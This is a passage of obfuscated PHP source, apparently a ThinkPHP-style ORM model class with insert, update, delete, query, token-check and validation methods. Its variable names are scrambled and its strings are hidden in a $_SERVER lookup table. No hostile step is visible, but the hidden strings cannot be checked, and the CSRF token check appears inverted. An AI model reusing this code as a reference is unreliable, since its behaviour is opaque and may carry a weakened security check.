$ñÂó˜¸ò[0] : $ù·ñõ‰¼[188]; $ì·Ø–Û¹ = $this->db->parseKey($ì·Ø–Û¹); return $this->getField(strtoupper($Øšş‡±) . $ù·ñõ‰¼[260] . $ì·Ø–Û¹ . $ù·ñõ‰¼[261] . $Øšş‡±, $ù·ñõ‰¼[255]); } elseif (strtolower(substr($Øšş‡±, 0, 5)) == $ù·ñõ‰¼[262]) { $ì·Ø–Û¹ = think_parse_name(substr($Øšş‡±, 5)); $ÜşèçêÛ[$ì·Ø–Û¹] = $ñÂó˜¸ò[0]; return $this->where($ÜşèçêÛ)->find(); } elseif (strtolower(substr($Øšş‡±, 0, 10)) == $ù·ñõ‰¼[263]) { $¡¼çÄÇ¶ = think_parse_name(substr($Øšş‡±, 10)); $ÜşèçêÛ[$¡¼çÄÇ¶] = $ñÂó˜¸ò[0]; return $this->where($ÜşèçêÛ)->getField($ñÂó˜¸ò[1]); } elseif (isset($this->_scope[$Øšş‡±])) { return $this->scope($Øšş‡±, $ñÂó˜¸ò[0]); } elseif (method_exists($this, $Øšş‡±)) { array_unshift($ñÂó˜¸ò, $Øšş‡±); return call_user_func_array(array($this, $ù·ñõ‰¼[264]), $ñÂó˜¸ò); } else { return call_user_func_array(array(parent, $Øšş‡±), $ñÂó˜¸ò); } } protected function call() { $»€ó­ =& $_SERVER[Ã¶¡¶„æ]; $÷š¸Ê®í = func_get_args(); $Îº¼¢Ø“ = array_shift($÷š¸Ê®í); $ƒ‰óÀû = $Îº¼¢Ø“; if (is_array($Îº¼¢Ø“)) { $ƒ‰óÀû = $Îº¼¢Ø“[1]; $Îº¼¢Ø“ = $Îº¼¢Ø“[0]; } $¿‹ÅµÆ½ = count($÷š¸Ê®í) - 1; if (isset($÷š¸Ê®í[$¿‹ÅµÆ½]) && $÷š¸Ê®í[$¿‹ÅµÆ½] === $Îº¼¢Ø“) { think_exception(__CLASS__ . $»€ó­[4] . $Îº¼¢Ø“ . think_lang($»€ó­[265])); return; } $÷š¸Ê®í[] = $Îº¼¢Ø“; if (method_exists($this, $»€ó­[266])) { $ùÜˆêÌ’ = call_user_func_array(array($this, $»€ó­[267]), array($ƒ‰óÀû, $÷š¸Ê®í)); if (!is_null($ùÜˆêÌ’) && $ùÜˆêÌ’ !== !1) { return $ùÜˆêÌ’; } } $»—»©¿ = call_user_func_array(array($this, $Îº¼¢Ø“), $÷š¸Ê®í); if (method_exists($this, $»€ó­[268])) { $ùÜˆêÌ’ = call_user_func_array(array($this, $»€ó­[269]), array($ƒ‰óÀû, $÷š¸Ê®í, $»—»©¿)); if ($ùÜˆêÌ’) { return $ùÜˆêÌ’; } } return $»—»©¿; } protected function _initialize() { } protected function _facade($¡æ‹ıûˆ) { $¸¸¿¥Ü« =& $_SERVER[Ã¶¡¶„æ]; if (!empty($this->fields)) { foreach ($¡æ‹ıûˆ as $º‹¤•¥ˆ => $ùŒâ­Ú‚) { if (is_array($this->fields) && !in_array($º‹¤•¥ˆ, $this->fields, !0)) { unset($¡æ‹ıûˆ[$º‹¤•¥ˆ]); } elseif (is_scalar($ùŒâ­Ú‚)) { $this->_parseType($¡æ‹ıûˆ, $º‹¤•¥ˆ); } } } if (!empty($this->options[$¸¸¿¥Ü«[270]])) { $¡æ‹ıûˆ = array_map($this->options[$¸¸¿¥Ü«[270]], $¡æ‹ıûˆ); unset($this->options[$¸¸¿¥Ü«[270]]); } $this->_beforeWrite($¡æ‹ıûˆ); return $¡æ‹ıûˆ; } protected function _beforeWrite(&$Â»ÓÌ‚Œ) { } public function add($·‘ææØ± = '', $šêöÌÒƒ = array(), $†äÒÖ½• = false) { if (empty($·‘ææØ±)) { if (!empty($this->data)) { $·‘ææØ± = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ã¶¡¶„æ][271]); return !1; } } $šêöÌÒƒ = $this->_parseOptions($šêöÌÒƒ); $·‘ææØ± = $this->_facade($·‘ææØ±); if (!1 === $this->_beforeInsert($·‘ææØ±, $šêöÌÒƒ)) { return !1; } $Â–ˆ¢‹² = $this->db->insert($·‘ææØ±, $šêöÌÒƒ, $†äÒÖ½•); if (!1 !== $Â–ˆ¢‹²) { $„çüŒå = $this->getLastInsID(); if ($„çüŒå) { $·‘ææØ±[$this->getPk()] = $„çüŒå; $this->_after_insert($·‘ææØ±, $šêöÌÒƒ); return $„çüŒå; } $this->_after_insert($·‘ææØ±, $šêöÌÒƒ); } return $Â–ˆ¢‹²; } protected function _beforeInsert(&$Ø¾ÆÍÉï, $Õı×¦) { } protected function _after_insert($ı­”ò»À, $Íì²é½±) { } public function addAll($²¢í•İ”, $ ‹õÄ½ = array(), $Œ½¹“ª = false) { $ò¦·Ä×ñ =& $_SERVER[Ã¶¡¶„æ]; if (empty($²¢í•İ”)) { $this->error = think_lang($ò¦·Ä×ñ[271]); return !1; } $ ‹õÄ½ = $this->_parseOptions($ ‹õÄ½); foreach ($²¢í•İ” as $ªêÅå†º => $‘Â´¨’É) { $²¢í•İ”[$ªêÅå†º] = $this->_facade($‘Â´¨’É); } if (method_exists($this->db, $ò¦·Ä×ñ[272])) { $½ÎáØÕ¨ = $this->db->insertAll($²¢í•İ”, $ ‹õÄ½, $Œ½¹“ª); } else { $this->startTrans(); foreach ($²¢í•İ” as $ªêÅå†º => $‘Â´¨’É) { $½ÎáØÕ¨ = $this->db->insert($‘Â´¨’É, $ ‹õÄ½, $Œ½¹“ª); } $this->commit(); } if (!1 !== $½ÎáØÕ¨) { $íĞòºûş = $this->getLastInsID(); if ($íĞòºûş) { return $íĞòºûş; } } return $½ÎáØÕ¨; } public function selectAdd($Ã²ë³Ğ“ = '', $£Æö ª¾ = '', $ñÒ´¥Ÿ› = array()) { $¤ÊØâÄ =& $_SERVER[Ã¶¡¶„æ]; $ñÒ´¥Ÿ› = $this->_parseOptions($ñÒ´¥Ÿ›); if (!1 === ($ïü¦ù± = $this->db->selectInsert($Ã²ë³Ğ“ ? $Ã²ë³Ğ“ : $ñÒ´¥Ÿ›[$¤ÊØâÄ[273]], $£Æö ª¾ ? $£Æö ª¾ : $this->getTableName(), $ñÒ´¥Ÿ›))) { $this->error = think_lang($¤ÊØâÄ[274]); return !1; } else { return $ïü¦ù±; } } public function save($åÇº¼ñê = '', $®Ÿº’à³ = array()) { $²äí€×Ì =& $_SERVER[Ã¶¡¶„æ]; if (empty($åÇº¼ñê)) { if (!empty($this->data)) { $åÇº¼ñê = $this->data; $this->data = array(); } else { $this->error = think_lang($²äí€×Ì[271]); return !1; } } $åÇº¼ñê = $this->_facade($åÇº¼ñê); $®Ÿº’à³ = $this->_parseOptions($®Ÿº’à³); $©¬³ç“« = $this->getPk(); if (!isset($®Ÿº’à³[$²äí€×Ì[275]])) { if (isset($åÇº¼ñê[$©¬³ç“«])) { $£È‚éêû[$©¬³ç“«] = $åÇº¼ñê[$©¬³ç“«]; $®Ÿº’à³[$²äí€×Ì[275]] = $£È‚éêû; unset($åÇº¼ñê[$©¬³ç“«]); } else { $this->error = think_lang($²äí€×Ì[274]); return !1; } } if (is_array($®Ÿº’à³[$²äí€×Ì[275]]) && isset($®Ÿº’à³[$²äí€×Ì[275]][$©¬³ç“«])) { $¬ÔºæÃÆ = $®Ÿº’à³[$²äí€×Ì[275]][$©¬³ç“«]; } if (!1 === $this->_beforeUpdate($åÇº¼ñê, $®Ÿº’à³)) { return !1; } $¿»¥Õ¾Í = $this->db->update($åÇº¼ñê, $®Ÿº’à³); if (!1 !== $¿»¥Õ¾Í) { if (isset($¬ÔºæÃÆ)) { $åÇº¼ñê[$©¬³ç“«] = $¬ÔºæÃÆ; } $this->_afterUpdate($åÇº¼ñê, $®Ÿº’à³); } return $¿»¥Õ¾Í; } protected function _beforeUpdate(&$¼áïºÖµ, $îÓŞ×û½) { } protected function _afterUpdate($ş„§Üğµ, $üò‰¹Ì) { } public function delete($¢¤¿îãÄ = array()) { $§îü£šò =& $_SERVER[Ã¶¡¶„æ]; if (empty($¢¤¿îãÄ) && empty($this->options[$§îü£šò[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $µŞ€Î¢¹ = $this->getPk(); if (is_numeric($¢¤¿îãÄ) || is_string($¢¤¿îãÄ)) { if (strpos($¢¤¿îãÄ, $§îü£šò[50])) { $¬’Úşş·[$µŞ€Î¢¹] = array($§îü£šò[276], $¢¤¿îãÄ); } else { $¬’Úşş·[$µŞ€Î¢¹] = $¢¤¿îãÄ; } $this->options[$§îü£šò[275]] = $¬’Úşş·; } $¢¤¿îãÄ = $this->_parseOptions(); if (is_array($¢¤¿îãÄ[$§îü£šò[275]]) && isset($¢¤¿îãÄ[$§îü£šò[275]][$µŞ€Î¢¹])) { $’ò´¹¯“ = $¢¤¿îãÄ[$§îü£šò[275]][$µŞ€Î¢¹]; } $¸–ÊíÉ÷ = $this->db->delete($¢¤¿îãÄ); if (!1 !== $¸–ÊíÉ÷) { $øÒ¸ñÇÂ = array(); if (isset($’ò´¹¯“)) { $øÒ¸ñÇÂ[$µŞ€Î¢¹] = $’ò´¹¯“; } $this->_after_delete($øÒ¸ñÇÂ, $¢¤¿îãÄ); } return $¸–ÊíÉ÷; } protected function _after_delete($òû†ä©, $áù´¡¾î) { } public function select($Êı¸‘í = array()) { $€œ =& $_SERVER[Ã¶¡¶„æ]; if (is_string($Êı¸‘í) || is_numeric($Êı¸‘í)) { $³ÅÌ•€ = $this->getPk(); if (strpos($Êı¸‘í, $€œ[50])) { $ˆ¸€è›º[$³ÅÌ•€] = array($€œ[276], $Êı¸‘í); } else { $ˆ¸€è›º[$³ÅÌ•€] = $Êı¸‘í; } $this->options[$€œ[275]] = $ˆ¸€è›º; } elseif (!1 === $Êı¸‘í) { $Êı¸‘í = $this->_parseOptions(); return $€œ[277] . $this->db->buildSelectSql($Êı¸‘í) . $€œ[278]; } $Êı¸‘í = $this->_parseOptions(); $”ó•é = $this->db->select($Êı¸‘í); if (!1 === $”ó•é) { return !1; } if (empty($”ó•é)) { return null; } $this->_afterSelect($”ó•é, $Êı¸‘í); return $”ó•é; } protected function _afterSelect(&$ß¶ù¦¦Œ, $œùã€£Û) { } public function buildSql($›‘Ş˜Õß = array()) { $ÑÑí¤œœ =& $_SERVER[Ã¶¡¶„æ]; $›‘Ş˜Õß = $this->_parseOptions($›‘Ş˜Õß); return $ÑÑí¤œœ[277] . $this->db->buildSelectSql($›‘Ş˜Õß) . $ÑÑí¤œœ[278]; } public function optionsValue($ËÛ€¸Š— = null) { if (is_null($ËÛ€¸Š—)) { return $this->options; } elseif (is_array($ËÛ€¸Š—)) { $this->options = array_merge($this->options, $ËÛ€¸Š—); } } protected function _parseOptions($Ñ¹£ŒÇ = array()) { $âùá‹ë =& $_SERVER[Ã¶¡¶„æ]; if (is_array($Ñ¹£ŒÇ)) { $Ñ¹£ŒÇ = array_merge($this->options, $Ñ¹£ŒÇ); } $this->options = array(); if (!isset($Ñ¹£ŒÇ[$âùá‹ë[279]])) { $Ñ¹£ŒÇ[$âùá‹ë[279]] = $this->getTableName(); $ÅÏ¢ÕÏ‰ = $this->fields; } else { $ÅÏ¢ÕÏ‰ = $this->getDbFields(); } if (!empty($Ñ¹£ŒÇ[$âùá‹ë[280]])) { $Ñ¹£ŒÇ[$âùá‹ë[279]] .= $âùá‹ë[53] . $Ñ¹£ŒÇ[$âùá‹ë[280]]; } $Ñ¹£ŒÇ[$âùá‹ë[281]] = $this->name; if (isset($Ñ¹£ŒÇ[$âùá‹ë[275]]) && is_array($Ñ¹£ŒÇ[$âùá‹ë[275]]) && !empty($ÅÏ¢ÕÏ‰) && !isset($Ñ¹£ŒÇ[$âùá‹ë[282]]) && !isset($Ñ¹£ŒÇ[$âùá‹ë[279]])) { foreach ($Ñ¹£ŒÇ[$âùá‹ë[275]] as $ßÀ¹‘–Ø => $¦ûâ‹ÊÅ) { $ßÀ¹‘–Ø = trim($ßÀ¹‘–Ø); if (in_array($ßÀ¹‘–Ø, $ÅÏ¢ÕÏ‰, !0)) { if (is_scalar($¦ûâ‹ÊÅ)) { $this->_parseType($Ñ¹£ŒÇ[$âùá‹ë[275]], $ßÀ¹‘–Ø); } } elseif (!is_numeric($ßÀ¹‘–Ø) && $âùá‹ë[11] != substr($ßÀ¹‘–Ø, 0, 1) && !1 === strpos($ßÀ¹‘–Ø, $âùá‹ë[10]) && !1 === strpos($ßÀ¹‘–Ø, $âùá‹ë[260]) && !1 === strpos($ßÀ¹‘–Ø, $âùá‹ë[283]) && !1 === strpos($ßÀ¹‘–Ø, $âùá‹ë[284])) { unset($Ñ¹£ŒÇ[$âùá‹ë[275]][$ßÀ¹‘–Ø]); } } } $this->_options_filter($Ñ¹£ŒÇ); return $Ñ¹£ŒÇ; } protected function _options_filter(&$äã‹ƒÈ) { } protected function _parseType(&$ˆåñµ™Æ, $ùöÂ¼­à) { $‚¥Á‹ğ° =& $_SERVER[Ã¶¡¶„æ]; if (empty($this->options[$‚¥Á‹ğ°[285]][$‚¥Á‹ğ°[4] . $ùöÂ¼­à])) { $·Åàúª™ = strtolower($this->fields[$‚¥Á‹ğ°[252]][$ùöÂ¼­à]); if (!1 !== strpos($·Åàúª™, $‚¥Á‹ğ°[286])) { } elseif (!1 === strpos($·Åàúª™, $‚¥Á‹ğ°[287]) && !1 !== strpos($·Åàúª™, $‚¥Á‹ğ°[288])) { $ˆåñµ™Æ[$ùöÂ¼­à] = intval($ˆåñµ™Æ[$ùöÂ¼­à]); } elseif (!1 !== strpos($·Åàúª™, $‚¥Á‹ğ°[289]) || !1 !== strpos($·Åàúª™, $‚¥Á‹ğ°[290])) { $ˆåñµ™Æ[$ùöÂ¼­à] = floatval($ˆåñµ™Æ[$ùöÂ¼­à]); } elseif (!1 !== strpos($·Åàúª™, $‚¥Á‹ğ°[291])) { $ˆåñµ™Æ[$ùöÂ¼­à] = (bool) $ˆåñµ™Æ[$ùöÂ¼­à]; } } } public function find($·Ç›¯–œ = array()) { $Âºú„ÆÛ =& $_SERVER[Ã¶¡¶„æ]; if (is_numeric($·Ç›¯–œ) || is_string($·Ç›¯–œ)) { $×‰¦®ÏÚ[$this->getPk()] = intval($·Ç›¯–œ); $this->options[$Âºú„ÆÛ[275]] = $×‰¦®ÏÚ; } $this->options[$Âºú„ÆÛ[292]] = 1; $·Ç›¯–œ = $this->_parseOptions(); $õ©ÁõÒ  = $this->db->select($·Ç›¯–œ); if (!1 === $õ©ÁõÒ ) { return !1; } if (empty($õ©ÁõÒ )) { return null; } $this->data = $õ©ÁõÒ [0]; $this->_afterFind($this->data, $·Ç›¯–œ); if (!empty($this->options[$Âºú„ÆÛ[293]])) { return $this->returnResult($this->data, $this->options[$Âºú„ÆÛ[293]]); } return $this->data; } protected function _afterFind(&$é×ÉÂ‡Ö, $ÌÏãğ²) { } protected function returnResult($šŞÙñà—, $‡™£ğïÇ = '') { $‹ûØã÷‰ =& $_SERVER[Ã¶¡¶„æ]; if ($‡™£ğïÇ) { if (is_callable($‡™£ğïÇ)) { return call_user_func($‡™£ğïÇ, $šŞÙñà—); } switch (strtolower($‡™£ğïÇ)) { case $‹ûØã÷‰[294]: return json_encode($šŞÙñà—); case $‹ûØã÷‰[295]: return xml_encode($šŞÙñà—); } } return $šŞÙñà—; } public function parseFieldsMap($äÎ¡ã¸£, $–„öÑ„‰ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $òóİ§‘ => $ƒ‡›š) { if ($–„öÑ„‰ == 1) { if (isset($äÎ¡ã¸£[$ƒ‡›š])) { $äÎ¡ã¸£[$òóİ§‘] = $äÎ¡ã¸£[$ƒ‡›š]; unset($äÎ¡ã¸£[$ƒ‡›š]); } } else { if (isset($äÎ¡ã¸£[$òóİ§‘])) { $äÎ¡ã¸£[$ƒ‡›š] = $äÎ¡ã¸£[$òóİ§‘]; unset($äÎ¡ã¸£[$òóİ§‘]); } } } } return $äÎ¡ã¸£; } public function setField($—‡ó Ã·, $Ö—ì¬”” = '') { if (is_array($—‡ó Ã·)) { $ºš‹ŒïŸ = $—‡ó Ã·; } else { $ºš‹ŒïŸ[$—‡ó Ã·] = $Ö—ì¬””; } return $this->save($ºš‹ŒïŸ); } public function setAdd($¯¶šÛ»š, $Æ¦¤Å• = 1) { $ı‡àù£Õ =& $_SERVER[Ã¶¡¶„æ]; $“Ü—ŸÜé = $¯¶šÛ»š . $ı‡àù£Õ[296] . $Æ¦¤Å•; if ($Æ¦¤Å• < 0) { $“Ü—ŸÜé = $¯¶šÛ»š . $Æ¦¤Å•; } return $this->setField($¯¶šÛ»š, array($ı‡àù£Õ[297], $“Ü—ŸÜé)); } public function getField($âá½ÎëÌ, $˜³œÒÑ = null) { $ƒ¤ê®º¬ =& $_SERVER[Ã¶¡¶„æ]; $ó·ìÛØÓ[$ƒ¤ê®º¬[273]] = $âá½ÎëÌ; $ó·ìÛØÓ = $this->_parseOptions($ó·ìÛØÓ); $âá½ÎëÌ = trim($âá½ÎëÌ); if (strpos($âá½ÎëÌ, $ƒ¤ê®º¬[50])) { if (!isset($ó·ìÛØÓ[$ƒ¤ê®º¬[292]])) { $ó·ìÛØÓ[$ƒ¤ê®º¬[292]] = is_numeric($˜³œÒÑ) ? $˜³œÒÑ : $ƒ¤ê®º¬[12]; } $áèŸùøò = $this->db->select($ó·ìÛØÓ); if (!empty($áèŸùøò)) { $®—Ë×›¢ = explode($ƒ¤ê®º¬[50], $âá½ÎëÌ); $âá½ÎëÌ = array_keys($áèŸùøò[0]); $²áÛœÀ˜ = array_shift($âá½ÎëÌ); $­âŠ®ÔÎ = array_shift($âá½ÎëÌ); $Ç£—ó¶ø = array(); $ÀÕ‘—ÂÕ = count($®—Ë×›¢); foreach ($áèŸùøò as $§³ïµ×) { $åË·ºÛã = $§³ïµ×[$²áÛœÀ˜]; if (2 == $ÀÕ‘—ÂÕ) { $Ç£—ó¶ø[$åË·ºÛã] = $§³ïµ×[$­âŠ®ÔÎ]; } else { $Ç£—ó¶ø[$åË·ºÛã] = is_string($˜³œÒÑ) ? implode($˜³œÒÑ, $§³ïµ×) : $§³ïµ×; } } return $Ç£—ó¶ø; } } else { if (!0 !== $˜³œÒÑ) { $ó·ìÛØÓ[$ƒ¤ê®º¬[292]] = is_numeric($˜³œÒÑ) ? $˜³œÒÑ : 1; } if ($˜³œÒÑ === $ƒ¤ê®º¬[255]) { unset($ó·ìÛØÓ[$ƒ¤ê®º¬[292]]); } $§³ïµ× = $this->db->select($ó·ìÛØÓ); if (!empty($§³ïµ×)) { if ($˜³œÒÑ === $ƒ¤ê®º¬[255]) { return reset($§³ïµ×[0]); } if (!0 !== $˜³œÒÑ && 1 == $ó·ìÛØÓ[$ƒ¤ê®º¬[292]]) { return reset($§³ïµ×[0]); } foreach ($§³ïµ× as $íí¯×©) { $¨ß¸Á¯Ú[] = $íí¯×©[$âá½ÎëÌ]; } return $¨ß¸Á¯Ú; } } return null; } public function create($Ñí¦Ø±Ï = '', $­ÉÒ¾ş´ = '') { $ÁŠ½Ù‚Á =& $_SERVER[Ã¶¡¶„æ]; if (empty($Ñí¦Ø±Ï)) { $Ñí¦Ø±Ï = $_POST; } elseif (is_object($Ñí¦Ø±Ï)) { $Ñí¦Ø±Ï = get_object_vars($Ñí¦Ø±Ï); } if (empty($Ñí¦Ø±Ï) || !is_array($Ñí¦Ø±Ï)) { $this->error = think_lang($ÁŠ½Ù‚Á[271]); return !1; } $Ñí¦Ø±Ï = $this->parseFieldsMap($Ñí¦Ø±Ï, 0); $­ÉÒ¾ş´ = $­ÉÒ¾ş´ ? $­ÉÒ¾ş´ : (!empty($Ñí¦Ø±Ï[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÁŠ½Ù‚Á[273]])) { $œ«®Ñ¦ñ = $this->options[$ÁŠ½Ù‚Á[273]]; unset($this->options[$ÁŠ½Ù‚Á[273]]); } elseif ($­ÉÒ¾ş´ == THINK_MODEL_INSERT && isset($this->insertFields)) { $œ«®Ñ¦ñ = $this->insertFields; } elseif ($­ÉÒ¾ş´ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $œ«®Ñ¦ñ = $this->updateFields; } if (isset($œ«®Ñ¦ñ)) { if (is_string($œ«®Ñ¦ñ)) { $œ«®Ñ¦ñ = explode($ÁŠ½Ù‚Á[50], $œ«®Ñ¦ñ); } if (think_config($ÁŠ½Ù‚Á[298])) { $œ«®Ñ¦ñ[] = think_config($ÁŠ½Ù‚Á[299]); } foreach ($Ñí¦Ø±Ï as $¦ò»´›Ó => $¥ÉÊêğì) { if (!in_array($¦ò»´›Ó, $œ«®Ñ¦ñ)) { unset($Ñí¦Ø±Ï[$¦ò»´›Ó]); } } } if (!$this->autoValidation($Ñí¦Ø±Ï, $­ÉÒ¾ş´)) { return !1; } if (!$this->autoCheckToken($Ñí¦Ø±Ï)) { $this->error = think_lang($ÁŠ½Ù‚Á[300]); return !1; } if ($this->autoCheckFields) { $œ«®Ñ¦ñ = $this->getDbFields(); foreach ($Ñí¦Ø±Ï as $¦ò»´›Ó => $¥ÉÊêğì) { if (!in_array($¦ò»´›Ó, $œ«®Ñ¦ñ)) { unset($Ñí¦Ø±Ï[$¦ò»´›Ó]); } elseif (MAGIC_QUOTES_GPC && is_string($¥ÉÊêğì)) { $Ñí¦Ø±Ï[$¦ò»´›Ó] = stripslashes($¥ÉÊêğì); } } } $this->autoOperation($Ñí¦Ø±Ï, $­ÉÒ¾ş´); $this->data = $Ñí¦Ø±Ï; return $Ñí¦Ø±Ï; } public function autoCheckToken($Öığ±İí) { $´·ã¨¶ =& $_SERVER[Ã¶¡¶„æ]; if (isset($this->options[$´·ã¨¶[301]]) && !$this->options[$´·ã¨¶[301]]) { return !0; } if (think_config($´·ã¨¶[298])) { $¢—Ãöœ = think_config($´·ã¨¶[299]); if (!isset($Öığ±İí[$¢—Ãöœ]) || Session::get($¢—Ãöœ)) { return !1; } list($±£“ÇíŒ, $Ÿú½ŞÀƒ) = explode($´·ã¨¶[11], $Öığ±İí[$¢—Ãöœ]); if ($Ÿú½ŞÀƒ && Session::get($¢—Ãöœ . $´·ã¨¶[10] . $±£“ÇíŒ) === $Ÿú½ŞÀƒ) { Session::remove($¢—Ãöœ . $´·ã¨¶[10] . $±£“ÇíŒ); return !0; } if (think_config($´·ã¨¶[302])) { Session::remove($¢—Ãöœ . $´·ã¨¶[10] . $±£“ÇíŒ); } return !1; } return !0; } public function regex($ÍøöË½±, $Â®§Ğæğ) { $»‚æ¡«ª =& $_SERVER[Ã¶¡¶„æ]; $¶ä¨¸‹— = array($»‚æ¡«ª[303] => $»‚æ¡«ª[304], $»‚æ¡«ª[305] => $»‚æ¡«ª[306], $»‚æ¡«ª[307] => $»‚æ¡«ª[308], $»‚æ¡«ª[309] => $»‚æ¡«ª[310], $»‚æ¡«ª[311] => $»‚æ¡«ª[312], $»‚æ¡«ª[313] => $»‚æ¡«ª[314], $»‚æ¡«ª[315] => $»‚æ¡«ª[316], $»‚æ¡«ª[290] => $»‚æ¡«ª[317], $»‚æ¡«ª[318] => $»‚æ¡«ª[319]); if (isset($¶ä¨¸‹—[strtolower($Â®§Ğæğ)])) { $Â®§Ğæğ = $¶ä¨¸‹—[strtolower($Â®§Ğæğ)]; } return preg_match($Â®§Ğæğ, $ÍøöË½±) === 1; } private function autoOperation(&$¢³şµ¸Ï, $ŸµÓø®ì) { $‡´¶÷ÉÊ =& $_SERVER[Ã¶¡¶„æ]; if (!empty($this->options[$‡´¶÷ÉÊ[320]])) { $Ç¾Ù–â« = $this->options[$‡´¶÷ÉÊ[320]]; unset($this->options[$‡´¶÷ÉÊ[320]]); } elseif (!empty($this->_auto)) { $Ç¾Ù–â« = $this->_auto; } if (isset($Ç¾Ù–â«)) { foreach ($Ç¾Ù–â« as $ÚİÆ¡¬) { if (empty($ÚİÆ¡¬[2])) { $ÚİÆ¡¬[2] = THINK_MODEL_INSERT; } if ($ŸµÓø®ì == $ÚİÆ¡¬[2] || $ÚİÆ¡¬[2] == THINK_MODEL_BOTH) { switch (trim($ÚİÆ¡¬[3])) { case $‡´¶÷ÉÊ[321]: case $‡´¶÷ÉÊ[322]: $ŠÅ™Œş = isset($ÚİÆ¡¬[4]) ? (array) $ÚİÆ¡¬[4] : array(); if (isset($¢³şµ¸Ï[$ÚİÆ¡¬[0]])) { array_unshift($ŠÅ™Œş, $¢³şµ¸Ï[$ÚİÆ¡¬[0]]); } if ($‡´¶÷ÉÊ[321] == $ÚİÆ¡¬[3]) { $¢³şµ¸Ï[$ÚİÆ¡¬[0]] = call_user_func_array($ÚİÆ¡¬[1], $ŠÅ™Œş); } else { $¢³şµ¸Ï[$ÚİÆ¡¬[0]] = call_user_func_array(array(&$this, $ÚİÆ¡¬[1]), $ŠÅ™Œş); } break; case $‡´¶÷ÉÊ[273]: $¢³şµ¸Ï[$ÚİÆ¡¬[0]] = $¢³şµ¸Ï[$ÚİÆ¡¬[1]]; break; case $‡´¶÷ÉÊ[323]: if ($‡´¶÷ÉÊ[12] === $¢³şµ¸Ï[$ÚİÆ¡¬[0]]) { unset($¢³şµ¸Ï[$ÚİÆ¡¬[0]]); } break; case $‡´¶÷ÉÊ[324]: default: $¢³şµ¸Ï[$ÚİÆ¡¬[0]] = $ÚİÆ¡¬[1]; } if (!1 === $¢³şµ¸Ï[$ÚİÆ¡¬[0]]) { unset($¢³şµ¸Ï[$ÚİÆ¡¬[0]]); } } } } return $¢³şµ¸Ï; } protected function autoValidation($ŠÈŞÕãü, $Ÿ°¦ü§) { $âşûª¦ =& $_SERVER[Ã¶¡¶„æ]; if (!empty($this->options[$âşûª¦[325]])) { $ˆ‚íâø– = $this->options[$âşûª¦[325]]; unset($this->options[$âşûª¦[325]]); } elseif (!empty($this->_validate)) { $ˆ‚íâø– = $this->_validate; } if (isset($ˆ‚íâø–)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ˆ‚íâø– as $•ÓŒâ¨Ğ => $”šÇ»õÛ) { if (empty($”šÇ»õÛ[5]) || $”šÇ»õÛ[5] == THINK_MODEL_BOTH || $”šÇ»õÛ[5] == $Ÿ°¦ü§) { if (0 == strpos($”šÇ»õÛ[2], $âşûª¦[326]) && strpos($”šÇ»õÛ[2], $âşûª¦[327])) { $”šÇ»õÛ[2] = think_lang(substr($”šÇ»õÛ[2], 2, -1)); } $”šÇ»õÛ[3] = isset($”šÇ»õÛ[3]) ? $”šÇ»õÛ[3] : THINK_EXISTS_VALIDATE; $”šÇ»õÛ[4] = isset($”šÇ»õÛ[4]) ? $”šÇ»õÛ[4] : $âşûª¦[328]; switch ($”šÇ»õÛ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ŠÈŞÕãü, $”šÇ»õÛ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($âşûª¦[12] != trim($ŠÈŞÕãü[$”šÇ»õÛ[0]])) { if (!1 === $this->_validationField($ŠÈŞÕãü, $”šÇ»õÛ)) { return !1; } } break; default: if (isset($ŠÈŞÕãü[$”šÇ»õÛ[0]])) { if (!1 === $this->_validationField($ŠÈŞÕãü, $”šÇ»õÛ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($•Ãıå¦¤, $×ë‚ä‚º) { if (!1 === $this->_validationFieldItem($•Ãıå¦¤, $×ë‚ä‚º)) { if ($this->patchValidate) { $this->error[$×ë‚ä‚º[0]] = $×ë‚ä‚º[2]; } else { $this->error = $×ë‚ä‚º[2]; return !1; } } return; } protected function _validationFieldItem($°§’à†å, $Á‘¸ı¼Ö) { $íŒß¸•Ã =& $_SERVER[Ã¶¡¶„æ]; switch (strtolower(trim($Á‘¸ı¼Ö[4]))) { case $íŒß¸•Ã[321]: case $íŒß¸•Ã[322]: $¹ßâ¾¹ = isset($Á‘¸ı¼Ö[6]) ? (array) $Á‘¸ı¼Ö[6] : array(); if (is_string($Á‘¸ı¼Ö[0]) && strpos($Á‘¸ı¼Ö[0], $íŒß¸•Ã[50])) { $Á‘¸ı¼Ö[0] = explode($íŒß¸•Ã[50], $Á‘¸ı¼Ö[0]); } if (is_array($Á‘¸ı¼Ö[0])) { foreach ($Á‘¸ı¼Ö[0] as $¨Ü£Ÿ¼Ô) { $·Æ‹…ÇÉ[$¨Ü£Ÿ¼Ô] = $°§’à†å[$¨Ü£Ÿ¼Ô]; } array_unshift($¹ßâ¾¹, $·Æ‹…ÇÉ); } else { array_unshift($¹ßâ¾¹, $°§’à†å[$Á‘¸ı¼Ö[0]]); } if ($íŒß¸•Ã[321] == $Á‘¸ı¼Ö[4]) { return call_user_func_array($Á‘¸ı¼Ö[1], $¹ßâ¾¹); } else { return call_user_func_array(array(&$this, $Á‘¸ı¼Ö[1]), $¹ßâ¾¹); } case $íŒß¸•Ã[329]: return $°§’à†å[$Á‘¸ı¼Ö[0]] == $°§’à†å[$Á‘¸ı¼Ö[1]]; case $íŒß¸•Ã[330]: if (is_string($Á‘¸ı¼Ö[0]) && strpos($Á‘¸ı¼Ö[0], $íŒß¸•Ã[50])) { $Á‘¸ı¼Ö[0] = explode($íŒß¸•Ã[50], $Á‘¸ı¼Ö[0]); } $öÊË€£ = array(); if (is_array($Á‘¸ı¼Ö[0])) { foreach ($Á‘¸ı¼Ö[0] as $¨Ü£Ÿ¼Ô) { $öÊË€£[$¨Ü£Ÿ¼Ô] = $°§’à†å[$¨Ü£Ÿ¼Ô]; } } else { $öÊË€£[$Á‘¸ı¼Ö[0]] = $°§’à†å[$Á‘¸ı¼Ö[0]]; } if (!empty($°§’à†å[$this->getPk()])) { $öÊË€£[$this->getPk()] = array($íŒß¸•Ã[331], $°§’à†å[$this->getPk()]); } if ($this->where($öÊË€£)->find()) 